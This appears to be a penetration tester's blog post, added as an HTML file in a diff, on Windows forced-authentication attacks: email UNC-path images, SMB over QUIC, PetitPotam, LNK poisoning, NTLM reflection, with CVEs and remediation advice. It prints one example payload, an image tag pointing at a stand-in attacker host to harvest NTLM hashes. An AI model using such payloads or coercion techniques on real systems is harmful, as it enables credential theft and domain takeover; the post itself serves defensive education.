@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerability Spotlight: Forced Authentication | The Adversary Co.</title>
+    <meta name="description" content="How forced authentication attacks exploit default Windows behavior to capture domain credentials, from email-based NTLM theft to SMB over QUIC and internal coercion techniques">
+
+    <!-- Open Graph / Social Media Preview -->
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Vulnerability Spotlight: Forced Authentication">
+    <meta property="og:description" content="How forced authentication attacks exploit default Windows behavior to capture domain credentials, from email-based NTLM theft to SMB over QUIC and internal coercion techniques">
+    <meta property="og:image" content="https://mattmillen15.github.io/adversaryco-site/images/fa-meme.png">
+    <meta property="og:url" content="https://mattmillen15.github.io/adversaryco-site/blog/forced-authentication.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://mattmillen15.github.io/adversaryco-site/images/fa-meme.png">
+
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="container">
+            <div class="nav-logo">
+                <a href="../index.html">
+                    <img src="../images/a-co-logo-transparent.png" alt="The Adversary Co.">
+                </a>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="../blog.html" class="active">Blog</a></li>
+                <li><a href="../contact.html">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <article class="blog-post">
+        <div class="container">
+            <header class="post-header">
+                <h1>Vulnerability Spotlight: Forced Authentication</h1>
+                <div class="post-meta">
+                    <span class="post-date">February 16, 2026</span>
+                    <span class="post-author">By: Matt Millen</span>
+                </div>
+            </header>
+
+            <div class="post-content">
+                <h2>Overview</h2>
+                <p>Imagine this attack path: An end user receives a completely uneventful email. From their perspective, it's just another marketing message — nothing suspicious, nothing worth a second look. Fifteen minutes later, they get an MFA push notification. They shrug it off. Outlook reauthenticates all the time. They tap Approve and move on with their day. Forty-five minutes later, an attacker has already gained control of your domain controllers.</p>
+
+                <p>That scenario isn't hypothetical, and it isn't rare. Variations of this exact chain have been used successfully by real threat actors targeting real organizations, including documented campaigns against critical infrastructure. (See: <a href="https://www.cisa.gov/news-events/alerts/2017/10/20/advanced-persistent-threat-activity-targeting-energy-and-other-critical-infrastructure-sectors" target="_blank" rel="noopener noreferrer">CISA Advisory on APT Activity Targeting Energy and Critical Infrastructure</a>)</p>
+
+                <p>This isn't about tricking users. It's about systems authenticating automatically — and the lack of proper egress filtering to stop it.</p>
+
+                <p>Forced authentication is the practice of deliberately causing a system to authenticate outbound to attacker-controlled infrastructure, whether by abusing default protocol behavior or by exploiting vulnerabilities that coerce authentication without meaningful user action.</p>
+
+                <div class="post-image">
+                    <img src="../images/forced-auth-flow-chart.png" alt="Forced authentication attack flow chart">
+                </div>
+
+                <h2>Forced Authentication Email Attacks</h2>
+                <p>The most common way we exploit forced authentication paths as penetration testers is via email. This is not a phishing attack and there is no pass/fail from the user's perspective. When this works, the failure sits squarely with improperly configured egress controls that allow SMB traffic to reach the public internet. When should SMB be allowed outbound to the internet? NEVER.</p>
+
+                <p>The attack itself is simple: a HTML email contains a embedded reference to a image hosted on an attacker-controlled server. There are many iterations of this but the most basic version is of an image tag pointing to a UNC path:</p>
+
+                <pre><code>&lt;img src="\\attacker-host\logo.png"&gt;</code></pre>
+
+                <p>When Outlook processes the email, it may attempt to retrieve the image automatically. Because the path points to an SMB share, Windows initiates an NTLM authentication attempt to the remote host. On the attacker's end, a Responder-style listener captures the user's domain Net-NTLMv2 password hash. (Note: Even if Outlook is not configured to not allow automatic image load, a simple pretext like the one below is way more successful in coercing that action than you'd think.)</p>
+
+                <div class="post-image">
+                    <img src="../images/sneaky-email.png" alt="Sneaky email pretext used to coerce image loading">
+                </div>
+
+                <p>Once the hash is captured, it can be cracked offline to recover the user's plaintext credential. From there an attacker is free to continue their attack as an authenticated user – whether that is exploiting the Microsoft Graph API, identifying lapses in MFA, or even performing a MFA fatigue attack to gain VPN access. If you're a client who has received a pentest from me over the years – this rings very true. Valid credentials is the first step to uncovering legitimate attack paths that compromise company resources.</p>
+
+                <div class="post-image">
+                    <img src="../images/forced-auth-hash.png" alt="Captured Net-NTLMv2 hash from forced authentication attack">
+                </div>
+
+                <h2>The Work From Home Problem</h2>
+                <p>Prior to 2020, we (pentesters) had success with forced authentication attacks, but they were more or less few and far between. On a properly secured network, SMB is blocked at the corporate perimeter. TCP 445 never made it to the internet, and the attack died quietly at the firewall. Then COVID happened. Work from home became the new norm, and that model broke. Egress filtering stopped being a purely network problem and became an endpoint problem – one many organizations never fully addressed. Most residential ISPs still allow outbound TCP 445, meaning that unless IT has thought of this problem, your remote workforce is likely vulnerable to this type of attack under the right conditions. Without proper Group Policy of MDM enforcement pushing outbound SMB restrictions to the endpoint's Windows Firewall, the protection simply isn't there.</p>
+
+                <h2>Leveling Up: SMB Over QUIC</h2>
+                <p>Over the last several years our pentest clients have performed better and better against this attack. Clients caught on – egress filtering drastically improved. That is until SMB over QUIC came into play.</p>
+
+                <p>SMB over QUIC is a feature introduced in Windows 11 and Windows Server 2022 (and yes, client support is enabled by default) that allows SMB traffic to run over the QUIC protocol on UDP port 443. It was designed to provide "SMB without VPN" for remote workers, allowing access to file shares over the internet without a traditional tunnel. On paper, that sounds convenient. In practice, it reintroduces SMB traffic over a port that almost every environment allows outbound.</p>
+
+                <div class="post-image">
+                    <img src="../images/quic-hash.png" alt="Net-NTLMv2 hash captured via SMB over QUIC">
+                </div>
+
+                <p>Adam Chester summed this up perfectly in his original write-up on SMB over QUIC exploitation:</p>
+
+                <blockquote>
+                    <p>"Think about that for a second. You block TCP 445 at every layer. Network firewall, host firewall, VPN split-tunnel rules — all of it. And then SMB traffic just shows up on UDP 443, a port that functionally cannot be blocked without breaking the internet. Thanks, Microsoft."</p>
+                </blockquote>
+
+                <p>To be fair, Microsoft's design of SMB over QUIC uses TLS 1.3 encryption and certificate validation, and the documentation states that NTLM authentication inside the QUIC tunnel is encrypted. But that doesn't help when the attacker controls the endpoint the client is authenticating to. The Net-NTLMv2 hash still gets captured by the attacker's Responder listener — it just arrives via a different transport now.</p>
+
+                <h2>Internal Forced Authentication</h2>
+                <p>Everything above focuses on external attack paths. Internally, forced authentication is a much easier exploited avenue, as the options for coercing authentication multiple significantly once you have a foothold – with weak protocol encryption like SMB or LDAP signing allow relay of the intercepted credentials rather than requiring cracking.</p>
+
+                <p><strong>PetitPotam</strong> abuses the MS-EFSRPC protocol to force a domain controller to authenticate to an attacker-controlled host. Relay that authentication to an AD CS server vulnerable to ESC-1, request a certificate for the DC's machine account, and you're looking at domain admin. Microsoft patched the unauthenticated variant, but the authenticated version is alive and well as a "feature".</p>
+
+                <p><strong>Slinky / LNK Poisoning</strong> is the internal equivalent of the email trick. Drop a malicious .lnk file onto a writable share with its icon path pointing to your listener, and anyone who browses that folder in Explorer sends you their hash.</p>
+
+                <p><strong>NTLM Reflection (CVE-2025-33073)</strong> is one of the more significant recent additions to this space. Disclosed by Synacktiv in June 2025, it bypasses NTLM reflection mitigations that have been in place since 2008. The short version: by abusing default AD DNS permissions to create a crafted hostname record, an attacker can trick Windows into thinking a remote NTLM authentication is local — causing LSASS to hand over a SYSTEM token. Standard domain user to SYSTEM on any machine without SMB signing enforced.</p>
+
+                <p><strong>WebDAV coercion</strong> is another internal technique that continues to be highly effective. As demonstrated in <a href="https://redfoxsec.com/blog/an-in-depth-exploration-into-webclient-abuse/" target="_blank" rel="noopener noreferrer">this blog by Redfoxsec</a>, WebDAV can be abused to coerce Windows systems to authenticate to attacker-controlled servers simply by accessing crafted paths or resources.</p>
+
+                <h2>Relevant Forced Authentication CVEs</h2>
+                <p>It's also worth calling out the steady stream of vulnerabilities that keep expanding the forced authentication attack surface year over year. These aren't edge cases – several of these were exploited in the wild by nation-state actors.</p>
+
+                <div class="table-wrapper">
+                    <table class="cve-table">
+                        <thead>
+                            <tr>
+                                <th>CVE</th>
+                                <th>Description</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>CVE-2023-23397</td>
+                                <td>Outlook EoP — malicious MAPI property with UNC path triggers NTLM auth on email receipt. Zero-click.</td>
+                            </tr>
+                            <tr>
+                                <td>CVE-2024-21413</td>
+                                <td>Outlook improper input validation — file:// URL handling triggers NTLM theft and RCE via preview pane.</td>
+                            </tr>
+                            <tr>
+                                <td>CVE-2023-35636</td>
+                                <td>Outlook calendar sharing — crafted headers coerce NTLM auth to attacker-controlled server.</td>
+                            </tr>
+                            <tr>
+                                <td>CVE-2024-43451</td>
+                                <td>Windows MSHTML engine — crafted .url files leak NTLMv2 hashes on preview or right-click.</td>
+                            </tr>
+                            <tr>
+                                <td>CVE-2025-24054</td>
+                                <td>NTLM hash leak via .library-ms files inside ZIP archives on extraction or preview.</td>
+                            </tr>
+                            <tr>
+                                <td>CVE-2025-33073</td>
+                                <td>NTLM reflection — bypasses mitigations in place since 2008 via crafted DNS records. Auth'd RCE as SYSTEM.</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h2>Security Impact and Risk</h2>
+                <p><strong>External Credential Compromise:</strong> Email-based forced authentication can capture domain credentials from remote workers without any user interaction. The captured hashes can be cracked offline for initial access to VPN, email, cloud services, and other externally facing resources.</p>
+
+                <p><strong>Bypass of Traditional Perimeter Controls:</strong> SMB over QUIC operating on UDP 443 renders traditional port-based egress SMB filtering ineffective, reintroducing an attack vector that many organizations believed they had closed.</p>
+
+                <p><strong>Internal Privilege Escalation:</strong> Coercion techniques like PetitPotam and NTLM reflection (CVE-2025-33073) assist in attack paths from standard domain user to domain administrator, often in a matter of minutes.</p>
+
+                <p><strong>Low Detection Likelihood:</strong> Forced authentication attacks generate minimal noise. The outbound SMB connection looks like normal network traffic, and the authentication exchange is a standard NTLM handshake. Without specific monitoring for outbound SMB to untrusted destinations, these attacks frequently go undetected.</p>
+
+                <h2>Remediation and Hardening Recommendations</h2>
+                <p>There's no single switch that fixes forced authentication. Effective mitigation requires layers. At a minimum:</p>
+
+                <ul>
+                    <li>Enforce egress SMB filtering at both the network firewall as well as at the Windows Firewall level.</li>
+                    <li>Disable SMB over QUIC unless you explicitly have a need for it.</li>
+                    <li>Enforce SMB signing, LDAP signing/channel binding, and equivalent protections on other authentication-backed services.</li>
+                    <li>Reduce NTLM usage wherever possible and monitor for NTLM authentication to unexpected hosts, especially outside the corporate network.</li>
+                    <li>Lock down writable shares.</li>
+                    <li>Validate controls off-network, not just on VPN.</li>
+                </ul>
+
+                <p>Most importantly, test these assumptions. Forced authentication is easy to validate, easy to miss, and very hard to dismiss once it works.</p>
+
+                <h2>References</h2>
+                <ul class="references">
+                    <li><a href="https://www.cisa.gov/news-events/alerts/2017/10/20/advanced-persistent-threat-activity-targeting-energy-and-other-critical-infrastructure-sectors" target="_blank" rel="noopener noreferrer">CISA – Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors</a></li>
+                    <li><a href="https://trustedsec.com/blog/making-smb-accessible-with-ntlmquic" target="_blank" rel="noopener noreferrer">TrustedSec – Making SMB Accessible with NTLMquic</a></li>
+                    <li><a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection" target="_blank" rel="noopener noreferrer">Synacktiv – NTLM Reflection Is Dead, Long Live NTLM Reflection (CVE-2025-33073)</a></li>
+                    <li><a href="https://redfoxsec.com/blog/an-in-depth-exploration-into-webclient-abuse/" target="_blank" rel="noopener noreferrer">Redfoxsec – WebClient / WebDAV Abuse for NTLM Coercion</a></li>
+                </ul>
+            </div>
+
+            <div class="post-footer">
+                <a href="../blog.html" class="btn btn-secondary">&larr; Back to Blog</a>
+            </div>
+        </div>
+    </article>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 The Adversary Co. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
